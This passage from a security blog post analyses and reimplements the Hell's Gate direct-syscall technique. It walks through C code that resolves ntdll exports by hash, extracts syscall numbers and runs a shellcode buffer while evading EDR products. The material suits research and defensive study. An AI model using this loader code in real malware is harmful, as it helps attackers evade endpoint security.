and identify NTDLL */ for (pEntry = pHeadEntry-\u0026gt;Flink; pEntry != pHeadEntry; pEntry = pEntry-\u0026gt;Flink) { /* If I understood correctly we must subtract 16 from the ntdll.dll entry in the InMemoryModuleList. This is neccessary because the Flink is not the first member of the LDR_DATA_TABLE_ENTRY structure, so when subtracting 0x10 we get the start of the structure for ntdll.dll */ pLdrDataTableEntry = (PLDR_DATA_TABLE_ENTRY)((std::int64_t)pEntry-0x10); /* Calculate a hash for the given DLL name */ dwDllNameSize = (pLdrDataTableEntry-\u0026gt;BaseDllName.Length) / sizeof(wchar_t); dwRorOperations = 0x00; dwModuleHash = 0x00; /* Hash the DLL name for identification */ for (int i = 0; i \u0026lt; dwDllNameSize; i++) { dwModuleHash = dwModuleHash + ((uint32_t)pLdrDataTableEntry-\u0026gt;BaseDllName.Buffer[i]); if (dwRorOperations \u0026lt; (dwDllNameSize - 1)) { dwModuleHash = _rotr(dwModuleHash, 0xd); } dwRorOperations++; } std::wprintf(L\u0026#34;[*] Found %ws (HASH: 0x%lx, ENTRY: 0x%lx)\\n\u0026#34;, pLdrDataTableEntry-\u0026gt;BaseDllName.Buffer, dwModuleHash, (std::int64_t)pLdrDataTableEntry); if (dwModuleHash == NTDLL_HASH) { std::wprintf(L\u0026#34;[+] Located ntdll: 0x%x\\n\u0026#34;, pLdrDataTableEntry); break; } } return pLdrDataTableEntry; } Getting the Export Address Table (EAT) of NTDLL # The next step we see is getting the Export Address Table of NTDLL.\nPIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL; if (!GetImageExportDirectory(pLdrDataEntry-\u0026gt;DllBase, \u0026amp;pImageExportDirectory) || pImageExportDirectory == NULL) return 0x01; Now looking at the source this function was created by the author of Hells Gate, let\u0026rsquo;s look at that source.\nBOOL GetImageExportDirectory(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory) { // Get DOS header PIMAGE_DOS_HEADER pImageDosHeader = (PIMAGE_DOS_HEADER)pModuleBase; if (pImageDosHeader-\u0026gt;e_magic != IMAGE_DOS_SIGNATURE) { return FALSE; } // Get NT headers PIMAGE_NT_HEADERS pImageNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)pModuleBase + pImageDosHeader-\u0026gt;e_lfanew); if (pImageNtHeaders-\u0026gt;Signature != IMAGE_NT_SIGNATURE) { return FALSE; } // Get the EAT *ppImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pModuleBase + pImageNtHeaders-\u0026gt;OptionalHeader.DataDirectory[0].VirtualAddress); return TRUE; } Let\u0026rsquo;s take a closer look at this in WinDbg.\nOnce we have the DataDirectory we can obtain the VirtualAddress of the Export Address Table from the first index in the DataDirectory. We can confirm this with !dh ntdll.dll -f.\nLet\u0026rsquo;s go ahead and quickly re-implement this.\nVOID GetExportAddressTable(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory) { PIMAGE_DOS_HEADER pImageDosHeader = (PIMAGE_DOS_HEADER)pModuleBase; PIMAGE_NT_HEADERS pImageNtHeaders = NULL; /* Verify that the DOS header is valid */ if (pImageDosHeader-\u0026gt;e_magic != IMAGE_DOS_SIGNATURE) { std::wcout \u0026lt;\u0026lt; L\u0026#34;[-] Failed to detect DOS header\\n\u0026#34;; return; } /* Get a pointer to the IMAGE_NT_HEADER structure of the module (ntdll.dll) */ pImageNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)pModuleBase + pImageDosHeader-\u0026gt;e_lfanew); if (pImageNtHeaders-\u0026gt;Signature != IMAGE_NT_SIGNATURE) { std::wcout \u0026lt;\u0026lt; L\u0026#34;[-] Failed to obtain pointer to IMAGE_NT_HEADERS\\n\u0026#34;; return; } /* Obtain the address of the EAT */ *ppImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pModuleBase + pImageNtHeaders-\u0026gt;OptionalHeader.DataDirectory[0].VirtualAddress); return; } Understanding GetVxTableEntry() # The next step we see is a declaration of a VX_TABLE structure along with a call to the function GetVxTableEntry().\nVX_TABLE Table = { 0 }; Table.NtAllocateVirtualMemory.dwHash = 0xf5bd373480a6b89b; if (!GetVxTableEntry(pLdrDataEntry-\u0026gt;DllBase, pImageExportDirectory, \u0026amp;Table.NtAllocateVirtualMemory)) return 0x1; Lets start breaking down the GetVxTableEntry() function. These first three lines\nBOOL GetVxTableEntry(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, PVX_TABLE_ENTRY pVxTableEntry) { PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory-\u0026gt;AddressOfFunctions); PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory-\u0026gt;AddressOfNames); PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)pModuleBase + pImageExportDirectory-\u0026gt;AddressOfNameOrdinals); Sadly, this structure is not open source. Luckily, I was able to find the structure definition on ReactOS as well as malware.in. Using this we can manually verify this to be true using WinDbg.\ntypedef struct _IMAGE_EXPORT_DIRECTORY { DWORD Characteristics; DWORD TimeDateStamp; WORD MajorVersion; WORD MinorVersion; DWORD Name; DWORD Base; DWORD NumberOfFunctions; DWORD NumberOfNames; PDWORD *AddressOfFunctions; PDWORD *AddressOfNames; PWORD *AddressOfNameOrdinals; } IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY; Using this structure we can start to map how this structure is used by the malware.\nThe next lines of code we see a pretty gnarly for-loop.\nfor (WORD cx = 0; cx \u0026lt; pImageExportDirectory-\u0026gt;NumberOfNames; cx++) { PCHAR pczFunctionName = (PCHAR)((PBYTE)pModuleBase + pdwAddressOfNames[cx]); PVOID pFunctionAddress = (PBYTE)pModuleBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]]; if (djb2(pczFunctionName) == pVxTableEntry-\u0026gt;dwHash) { pVxTableEntry-\u0026gt;pAddress = pFunctionAddress; // Quick and dirty fix in case the function has been hooked WORD cw = 0; while (TRUE) { // check if syscall, in this case we are too far if (*((PBYTE)pFunctionAddress + cw) == 0x0f \u0026amp;\u0026amp; *((PBYTE)pFunctionAddress + cw + 1) == 0x05) return FALSE; // check if ret, in this case we are also probaly too far if (*((PBYTE)pFunctionAddress + cw) == 0xc3) return FALSE; // First opcodes should be : // MOV R10, RCX // MOV RCX, \u0026lt;syscall\u0026gt; if (*((PBYTE)pFunctionAddress + cw) == 0x4c \u0026amp;\u0026amp; *((PBYTE)pFunctionAddress + 1 + cw) == 0x8b \u0026amp;\u0026amp; *((PBYTE)pFunctionAddress + 2 + cw) == 0xd1 \u0026amp;\u0026amp; *((PBYTE)pFunctionAddress + 3 + cw) == 0xb8 \u0026amp;\u0026amp; *((PBYTE)pFunctionAddress + 6 + cw) == 0x00 \u0026amp;\u0026amp; *((PBYTE)pFunctionAddress + 7 + cw) == 0x00) { BYTE high = *((PBYTE)pFunctionAddress + 5 + cw); BYTE low = *((PBYTE)pFunctionAddress + 4 + cw); pVxTableEntry-\u0026gt;wSystemCall = (high \u0026lt;\u0026lt; 8) | low; break; } cw++; }; } } Let\u0026rsquo;s break down the first few lines.\nFirst, we see that we are iterating over the number of names in the IMAGE_EXPORT_DIRECTORY (for (WORD cx = 0; cx \u0026lt; pImageExportDirectory-\u0026gt;NumberOfNames; cx++) {) Then we iterate over each function name just as we saw in WinDbg PCHAR pczFunctionName = (PCHAR)((PBYTE)pModuleBase + pdwAddressOfNames[cx]); Next, we get the function addresses as prevously seen PVOID pFunctionAddress = (PBYTE)pModuleBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]]; If we re-implement this in our PoC we see the following:\nThe next line is an if condition. Intrestingly, we see the introduction of a new function djb2().\nif (djb2(pczFunctionName) == pVxTableEntry-\u0026gt;dwHash) { In addition, we once more see our previously set dwHash. Now from my perspective this does not appear to be necessary. We could use any other hashing function\u0026hellip; but for now I\u0026rsquo;ll leave this function as designed.\nThe next block of code is rather \u0026ldquo;large\u0026rdquo;, we see a few checks then we see we ultimately look for opcodes 0x4c, 0x8bx 0xd1, 0xb8, 0x00, and 0x00.\npVxTableEntry-\u0026gt;pAddress = pFunctionAddress; // Quick and dirty fix in case the function has been hooked WORD cw = 0; while (TRUE) { // check if syscall, in this case we are too far if (*((PBYTE)pFunctionAddress + cw) == 0x0f \u0026amp;\u0026amp; *((PBYTE)pFunctionAddress + cw + 1) == 0x05) return FALSE; // check if ret, in this case we are also probaly too far if (*((PBYTE)pFunctionAddress + cw) == 0xc3) return FALSE; // First opcodes should be : // MOV R10, RCX // MOV RCX, \u0026lt;syscall\u0026gt; if (*((PBYTE)pFunctionAddress + cw) == 0x4c \u0026amp;\u0026amp; *((PBYTE)pFunctionAddress + 1 + cw) == 0x8b \u0026amp;\u0026amp; *((PBYTE)pFunctionAddress + 2 + cw) == 0xd1 \u0026amp;\u0026amp; *((PBYTE)pFunctionAddress + 3 + cw) == 0xb8 \u0026amp;\u0026amp; *((PBYTE)pFunctionAddress + 6 + cw) == 0x00 \u0026amp;\u0026amp; *((PBYTE)pFunctionAddress + 7 + cw) == 0x00) { BYTE high = *((PBYTE)pFunctionAddress + 5 + cw); BYTE low = *((PBYTE)pFunctionAddress + 4 + cw); pVxTableEntry-\u0026gt;wSystemCall = (high \u0026lt;\u0026lt; 8) | low; break; } cw++; If we look at this in sickle this is indeed mov r10, rcx. However, based on the output we may be able to just use 0x4c, 0x8b, and 0xd1.\n┌──(wetw0rk㉿kali)-[/opt/Sickle/src] └─$ python3 sickle.py -m asm_shell -f c [*] ASM Shell loaded for x64 architecture sickle \u0026gt; d 4c8bd1b80000 4c8bd1 -\u0026gt; mov r10, rcx If we update our PoC once more.\nBOOL GetVxTableEntry(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, PVX_TABLE_ENTRY pVxTableEntry) { PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory-\u0026gt;AddressOfFunctions); PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory-\u0026gt;AddressOfNames); PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)pModuleBase + pImageExportDirectory-\u0026gt;AddressOfNameOrdinals); WORD cx = 0x00; WORD cw = 0x00; PCHAR pczFunctionName = NULL; PVOID pFunctionAddress = NULL; for (cx = 0; cx \u0026lt; pImageExportDirectory-\u0026gt;NumberOfNames; cx++) { pczFunctionName = (PCHAR)((PBYTE)pModuleBase + pdwAddressOfNames[cx]); pFunctionAddress = (PBYTE)pModuleBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]]; /* We found the target function */ if (djb2((PBYTE)pczFunctionName) == pVxTableEntry-\u0026gt;dwHash) { pVxTableEntry-\u0026gt;pAddress = pFunctionAddress; while (TRUE) { printf(\u0026#34;[*] Found target function: %s (0x%p)\\n\u0026#34;, pczFunctionName, pFunctionAddress); if (*((PBYTE)pFunctionAddress + cw) == 0x4c \u0026amp;\u0026amp; *((PBYTE)pFunctionAddress + 1 + cw) == 0x8b \u0026amp;\u0026amp; *((PBYTE)pFunctionAddress + 2 + cw) == 0xd1 \u0026amp;\u0026amp; *((PBYTE)pFunctionAddress + 3 + cw) == 0xb8 \u0026amp;\u0026amp; *((PBYTE)pFunctionAddress + 6 + cw) == 0x00 \u0026amp;\u0026amp; *((PBYTE)pFunctionAddress + 7 + cw) == 0x00) { printf(\u0026#34;[+] Syscall found @{0x%p}\\n\u0026#34;, (PVOID)((intptr_t)pFunctionAddress + cw)); getchar(); } cw++; } } } return TRUE; } We can see that this syscall is successfully located the instructions.\nFinally, we see that if we locate this sequence of bytes / instructions we write the syscall to the VX_TABLE structure.\nBYTE high = *((PBYTE)pFunctionAddress + 5 + cw); BYTE low = *((PBYTE)pFunctionAddress + 4 + cw); pVxTableEntry-\u0026gt;wSystemCall = (high \u0026lt;\u0026lt; 8) | low; Not sure exactly why we must store it like this (we may be able to re-implement it), however in WinDBG we can see when we read from this value it\u0026rsquo;s pretty straight-forward.\nWe have now implemented our own version of this function to have an understanding of its underlying operations.\nBOOL GetVxTableEntry(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, PVX_TABLE_ENTRY pVxTableEntry) { PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory-\u0026gt;AddressOfFunctions); PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory-\u0026gt;AddressOfNames); PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)pModuleBase + pImageExportDirectory-\u0026gt;AddressOfNameOrdinals); BYTE high = 0x00; BYTE low = 0x00; WORD cx = 0x00; WORD cw = 0x00; PCHAR pczFunctionName = NULL; PVOID pFunctionAddress = NULL; for (cx = 0; cx \u0026lt; pImageExportDirectory-\u0026gt;NumberOfNames; cx++) { pczFunctionName = (PCHAR)((PBYTE)pModuleBase + pdwAddressOfNames[cx]); pFunctionAddress = (PBYTE)pModuleBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]]; /* We found the target function */ if (djb2((PBYTE)pczFunctionName) == pVxTableEntry-\u0026gt;dwHash) { pVxTableEntry-\u0026gt;pAddress = pFunctionAddress; /* Quick and dirty fix in case the function has been hooked */ while (TRUE) { /* Check if a syscall instruction has been reached, if so we are too deep into the function */ if (*((PBYTE)pFunctionAddress + cw) == 0x0f \u0026amp;\u0026amp; *((PBYTE)pFunctionAddress + cw + 1) == 0x05) return FALSE; /* Check if a ret instruction has been reached, if so we read to deep into the function */ if (*((PBYTE)pFunctionAddress + cw) == 0xc3) return FALSE; if (*((PBYTE)pFunctionAddress + cw) == 0x4c \u0026amp;\u0026amp; *((PBYTE)pFunctionAddress + 1 + cw) == 0x8b \u0026amp;\u0026amp; *((PBYTE)pFunctionAddress + 2 + cw) == 0xd1 \u0026amp;\u0026amp; *((PBYTE)pFunctionAddress + 3 + cw) == 0xb8 \u0026amp;\u0026amp; *((PBYTE)pFunctionAddress + 6 + cw) == 0x00 \u0026amp;\u0026amp; *((PBYTE)pFunctionAddress + 7 + cw) == 0x00) { high = *((PBYTE)pFunctionAddress + 5 + cw); low = *((PBYTE)pFunctionAddress + 4 + cw); pVxTableEntry-\u0026gt;wSystemCall = (high \u0026lt;\u0026lt; 8) | low; printf(\u0026#34;[*] %s syscall start found @{0x%p}\\n\u0026#34;, pczFunctionName, (PVOID)((intptr_t)pFunctionAddress + cw)); printf(\u0026#34;\\t[*] High: 0x%x\\n\u0026#34;, high); printf(\u0026#34;\\t[*] Low: 0x%x\\n\u0026#34;, low); printf(\u0026#34;\\t[*] Syscall: 0x%x\\n\u0026#34;, pVxTableEntry-\u0026gt;wSystemCall); break; } cw++; } } } return TRUE; } With that we can introduce the rest of the main function.\nvxTable.NtAllocateVirtualMemory.dwHash = 0xf5bd373480a6b89b; if (!GetVxTableEntry(pNtdllEntry-\u0026gt;DllBase, pImageExportDirectory, \u0026amp;vxTable.NtAllocateVirtualMemory)) return 0x01; vxTable.NtCreateThreadEx.dwHash = 0x64dc7db288c5015f; if (!GetVxTableEntry(pNtdllEntry-\u0026gt;DllBase, pImageExportDirectory, \u0026amp;vxTable.NtCreateThreadEx)) return 0x1; vxTable.NtProtectVirtualMemory.dwHash = 0x858bcb1046fb6a37; if (!GetVxTableEntry(pNtdllEntry-\u0026gt;DllBase, pImageExportDirectory, \u0026amp;vxTable.NtProtectVirtualMemory)) return 0x1; vxTable.NtWaitForSingleObject.dwHash = 0xc6a2fa174e551bcb; if (!GetVxTableEntry(pNtdllEntry-\u0026gt;DllBase, pImageExportDirectory, \u0026amp;vxTable.NtWaitForSingleObject)) return 0x1; Understanding Payload() # Finally, we\u0026rsquo;re at the final function call in the main() function.\nPayload(\u0026amp;Table); We can see that this is, yet another custom function implemented by the author. However, we see three additional custom functions HellsGate, HellsDescent, and VxMoveMemory.\nBOOL Payload(PVX_TABLE pVxTable) { NTSTATUS status = 0x00000000; char shellcode[] = \u0026#34;\\x90\\x90\\x90\\x90\\xcc\\xcc\\xcc\\xcc\\xc3\u0026#34;; // Allocate memory for the shellcode PVOID lpAddress = NULL; SIZE_T sDataSize = sizeof(shellcode); HellsGate(pVxTable-\u0026gt;NtAllocateVirtualMemory.wSystemCall); status = HellDescent((HANDLE)-1, \u0026amp;lpAddress, 0, \u0026amp;sDataSize, MEM_COMMIT, PAGE_READWRITE); // Write Memory VxMoveMemory(lpAddress, shellcode, sizeof(shellcode)); // Change page permissions ULONG ulOldProtect = 0; HellsGate(pVxTable-\u0026gt;NtProtectVirtualMemory.wSystemCall); status = HellDescent((HANDLE)-1, \u0026amp;lpAddress, \u0026amp;sDataSize, PAGE_EXECUTE_READ, \u0026amp;ulOldProtect); // Create thread HANDLE hHostThread = INVALID_HANDLE_VALUE; HellsGate(pVxTable-\u0026gt;NtCreateThreadEx.wSystemCall); status = HellDescent(\u0026amp;hHostThread, 0x1FFFFF, NULL, (HANDLE)-1, (LPTHREAD_START_ROUTINE)lpAddress, NULL, FALSE, NULL, NULL, NULL, NULL); // Wait for 1 seconds LARGE_INTEGER Timeout; Timeout.QuadPart = -10000000; HellsGate(pVxTable-\u0026gt;NtWaitForSingleObject.wSystemCall); status = HellDescent(hHostThread, FALSE, \u0026amp;Timeout); return TRUE; } Understanding HellsGate # We can go ahead and ignore the underlying operations of VxMoveMemory as this is just a custom implementation of memcpy(). However we can start to understand the underlying operations of the first call - HellsGate.\n.data wSystemCall DWORD 000h .code HellsGate PROC mov wSystemCall, 000h mov wSystemCall, ecx ret HellsGate ENDP Let\u0026rsquo;s set a DebugBreak(); just before this call.\nDebugBreak(); HellsGate(pVxTable-\u0026gt;NtAllocateVirtualMemory.wSystemCall); Once ran in WinDbg, we see that we\u0026rsquo;re about to enter the call to HellsGate.\nOnce in, we can see that we\u0026rsquo;ll be executing the syscalls we dynamically resolved.\nUnderstanding HellsDescent # At this point our Assembler stub holds the syscall number for NtAllocateVirtualMemory within the .data section of the binary. The next step is to call HellsDescent where we actually execute the syscall.\nstatus = HellDescent((HANDLE)-1, \u0026amp;lpAddress, 0, \u0026amp;sDataSize, MEM_COMMIT, PAGE_READWRITE); When we get to HellsDescent we can see that we are moving RCX into R10. Now normally when issuing a function call the arguments are sent in the order RCX, RDX, R8, R9 and any additional arguments on the stack at offset 0x20. If we look at the function prototype for NtAllocateMemory() we quickly see that all these arguments simply cannot be stored within RCX unless RCX is a pointer to an object.\n__kernel_entry NTSYSCALLAPI NTSTATUS NtAllocateVirtualMemory( [in] HANDLE ProcessHandle, [in, out] PVOID *BaseAddress, [in] ULONG_PTR ZeroBits, [in, out] PSIZE_T RegionSize, [in] ULONG AllocationType, [in] ULONG Protect ); This is further confirmed when dumping the register states.\nAt this point we can say we have a solid idea on how HellsGate operates :)\nParse the InMemoryOrderModuleList and obtain the base address of NTDLL Obtain the address of the Export Address Table for NTDLL Parse the EAT in search for target syscalls Execute syscalls Profit PoC | GTFO (Ezekiels Wheel) # We have learned the inner mechanisms of Hell’s Gate operations, now we can use this newfound knowledge to write our own implementation. Although optimized for evasion (Ezekiels Wheel), it’s important to know this would not have been possible without understanding the fundamentals of Windows Syscalls.\nThe changes in Ezekiels Wheel are as follows:\nDynamic syscall search, we do not rely on having hardcoded syscall instructions in our code Code re-use, we leverage existing ntdll.dll syscalls so EDR\u0026rsquo;s believe operations to be normal We have re-implemented our own hashing technique when searching for function routines We gave it a cool name ;) Ezekiel 10:10 As for their appearance, all four looked alike—as it were, a wheel in the middle of a wheel.\nSources # http://malwareid.in/unpack/unpacking-basics/export-address-table-and-dll-hijacking https://doxygen.reactos.org/de/d20/struct__IMAGE__EXPORT__DIRECTORY.html https://learn.microsoft.com/en-us/windows/win32/api/ntdef/nf-ntdef-containing_record https://davidesnotes.com/articles/1/?page=1# https://gist.github.com/Spl3en/9c0ea329bb7878df9b9b https://redops.at/en/blog/exploring-hells-gate http://www.rohitab.com/discuss/topic/42191-c-peb-ldr-inmemoryordermodulelist-flink-dllbase-dont-get-the-good-address/ https://www.vergiliusproject.com/ https://alice.climent-pommeret.red/posts/direct-syscalls-hells-halos-syswhispers2/ https://www.youtube.com/watch?v=elA_eiqWefw\u0026amp;t=2s ","date":"23 November 2024","externalUrl":null,"permalink":"/posts/ezekielswheel/ezekielswheel/","section":"Posts","summary":"","title":"Ezekiels Wheel (Hells Gate Analysis)","type":"posts"},{"content":"","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series","type":"series"},{"content":"","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"}]